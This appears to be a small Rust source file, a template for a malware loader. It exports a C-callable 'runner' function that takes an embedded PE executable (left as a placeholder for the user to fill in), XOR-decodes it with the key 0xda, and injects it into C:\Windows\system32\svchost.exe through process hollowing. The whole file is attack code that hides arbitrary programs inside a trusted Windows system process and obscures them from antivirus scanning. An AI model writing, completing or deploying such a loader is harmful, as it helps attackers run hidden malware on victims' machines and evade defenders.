#[no_mangle]
pub extern "C" fn runner() -> () {    
    let payload = vec![
        // Put your PE executable, here. You can also use include_bytes!()
    ];
    process_hollow::hollow64(
        "C:\\Windows\\system32\\svchost.exe",
        payload.into_iter().map(|x| x ^ 0xda).collect(),
    ).unwrap();
}